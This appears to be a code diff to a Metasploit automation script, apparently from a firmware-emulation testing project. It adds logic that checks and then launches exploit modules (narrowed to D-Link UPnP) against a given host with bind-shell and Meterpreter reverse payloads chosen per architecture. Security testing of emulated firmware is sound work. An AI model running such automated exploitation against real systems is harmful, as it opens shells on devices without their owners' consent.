@@ -20,7 +20,50 @@ def help_me
   print_line(help)
 end
 
-def exploit_checker(host,ports)
+@job_ids = []
+
+def wait_until_jobs_done
+  loop do
+    @job_ids.each do |job_id|
+      current_job_ids = framework.jobs.keys.map { |e| e.to_i }
+      sleep 1 if current_job_ids.include?(job_id)
+    end
+
+    return
+  end
+end
+
+def select_payload(exploit,arch)
+	linux   = "linux/#{arch}/shell_bind_tcp"
+  php     = 'php/meterpreter_reverse_tcp'
+	multi   = 'java/meterpreter/reverse_tcp'
+	cmd     = 'cmd/unix/interact'
+	generic = 'generic/shell_bind_tcp'
+
+	payloads = []
+	exploit.compatible_payloads.each do |p|
+		payloads << p[0]
+	end
+
+	if payloads.include?(linux)
+		return linux
+	elsif payloads.include?(php)
+		return php
+	elsif payloads.include?(multi)
+		return multi
+	elsif payloads.include?(cmd)
+		return cmd
+	elsif payloads.include?(generic)
+		return generic
+	else
+		# WTF? This exploit supports NONE of our favorite payloads?
+		# What kinda BS is this?
+		return linux
+		#return nil
+	end
+end
+
+def exploit_checker(host,ports,architecture)
   print_status("Checking host #{host} with identified ports #{ports}...")
   framework.exploits.each { |name,mod|
     mod = framework.modules.create("#{name}")
@@ -31,6 +74,7 @@ def exploit_checker(host,ports)
     end
 
     # remove modules that we won't check:
+    next if not (name =~ /dlink_upnp/)
     next if (name =~ /local/ or
              name =~ /fileformat/ or
              name =~ /browser/)
@@ -44,25 +88,91 @@ def exploit_checker(host,ports)
     next if (name =~ /cve_2020_13160_anydesk/ or
              name =~ /goahead_ldpreload/)
 
+
+    print_line("")
     ports.split(",").each { |serv|
       # we test only matching ports - default RPORT of module matches
       # open port we identified in emulation phase
       next if (mod.datastore['RPORT'].to_s != serv.to_s)
 
-      print_status("Checking #{name} against host #{host}:#{serv} ...")
-      run_single("use #{name}")
-      run_single("set VERBOSE false")
-      run_single("set RHOSTS #{host}")
-      run_single("set LHOST 0.0.0.0")
-      run_single("set VHOST 0.0.0.0")
+      mod.datastore['VERBOSE'] = "true"
+      mod.datastore['RHOSTS'] = host.to_s
+      #mod.datastore['LHOST'] = "0.0.0.0"
+      #mod.datastore['VHOST'] = "0.0.0.0"
+      #mod.datastore['SRVHOST'] = "0.0.0.0"
+      #srvportt_setting = rand(4000..40_862).to_s
+      #mod.datastore['SRVPORT'] = srvportt_setting
       # set random LPORT to open enough listeners for reverse connections:
       lport_setting = rand(4000..40_862).to_s
-      run_single("set LPORT #{lport_setting}")
-      run_single("check")
-      run_single("exploit -j")
+      mod.datastore['LPORT'] = lport_setting
+      if architecture == "mipsbe"
+        # mipsle is mostly target 1
+        mod.datastore['TARGET'] = 1
+      end
+      if architecture == "mipsle"
+        # mipsle is mostly target 0
+        mod.datastore['TARGET'] = 0
+      end
+        
+
+      print_status("Checking #{name} against host #{host.to_s}:#{serv} ...")
+      begin
+        #check_code = mod.check_simple({'RunAsJob': true, 'LocalOutput': self.output})
+        check_code = mod.check_simple({'RunAsJob': true})
+        if mod.job_id
+          print_status("Check #{name} job ID for target #{host.to_s} is: #{mod.job_id}")
+          @job_ids << mod.job_id
+        end
+        print_status("Check code for #{name}: #{check_code.to_s}")
+        if (check_code =~ /Vulnerable/ or check_code =~ /Appears/)
+          print_good("Vulnerability identified with #{check_code} - module #{name} - #{host.to_s}:#{serv}")
+        end
+      rescue ::Exception => e
+        print_error(e.message)
+      end
+
+      print_status("Exploiting #{name} against host #{host.to_s}:#{serv} ...")
+      get_payload = select_payload(mod,architecture)
+      # lhost       = Rex::Socket.source_address('50.50.50.50')
+      #lhost = "0.0.0.0"
+      #mod.datastore['LHOST'] = lhost
+      mod.datastore['RHOST'] = host.to_s
+
+      if get_payload.nil?
+        #raise RuntimeError, "No payload selected for this exploit"
+        print_error("No payload selected for this exploit: #{name}")
+      else
+        print_status("Payload selected: #{get_payload}")
+      end
+
+      begin
+        #lport_setting = rand(4000..40_862).to_s
+        mod.datastore['LPORT'] = 4444
+        #lport_setting
+        print_status("#{mod.datastore}")
+        session = mod.exploit_simple({'RunAsJob': false, 'LocalOutput': self.output})
+        if mod.job_id
+          print_status("Exploit #{name} job ID for target #{host.to_s} is: #{mod.job_id}")
+          @job_ids << mod.job_id
+        end
+        print_status("Exploit code for #{name}: #{session}")
+        #if (exploit_code =~ /Vulnerable/ or check_code =~ /Appears/)
+        #  print_good("Vulnerability identified with #{check_code} - module #{name} - #{host.to_s}:#{serv}")
+        #end
+      rescue ::Exception => e
+        print_error(e.message)
+      end
+
+
+      #run_single("exploit -j")
+      #lport_setting = rand(4000..40_862).to_s
+      #run_single("set LPORT #{lport_setting}")
+      #run_single("set PAYLOAD linux/#{architecture}/shell_bind_tcp")
+      #run_single("exploit -j")
     }
   }
   print_status("All exploits sent to #{host} ... lets wait a few seconds")
+  wait_until_jobs_done
 end
 
 
@@ -79,11 +189,13 @@ def init_args
   datastore        = framework.datastore
   args[:host]      = ARGV.shift || ''
   args[:ports]     = ARGV.shift || ''
+  args[:architecture]      = ARGV.shift || ''
 
   raise ArgumentError, "Missing a host ip address" if args[:host].empty?
   raise ArgumentError, "Missing port list" if args[:ports].empty?
   print_line("Ports: #{args[:ports]}")
   print_line("Host: #{args[:host]}")
+  print_line("ARCH: #{args[:architecture]}")
 
   return args
 end
@@ -92,7 +204,7 @@ end
 #
 # main
 #
-print_status("Starting Metasploit analysis ..."
+print_status("Starting Metasploit analysis ...")
 begin
   args = init_args
   if args[:help]
@@ -102,10 +214,12 @@ begin
 
   # as we have no db connection we need to analyze the logs
   # logs with colors make things usually harder to grep
-  run_single("color false")
-  run_single("set ConsoleLogging true")
-  run_single("set SessionLogging true")
-  exploit_checker(args[:host],args[:ports])
+  run_single("color true")
+  run_single("setg ConsoleLogging true")
+  run_single("setg SessionLogging true")
+  run_single("setg VERBOSE true")
+  exploit_checker(args[:host],args[:ports],args[:architecture])
+  # auxiliary_checker(args[:host],args[:ports],args[:arch])
 rescue ArgumentError => e
   print_error("Invalid argument: #{e.message}")
   return
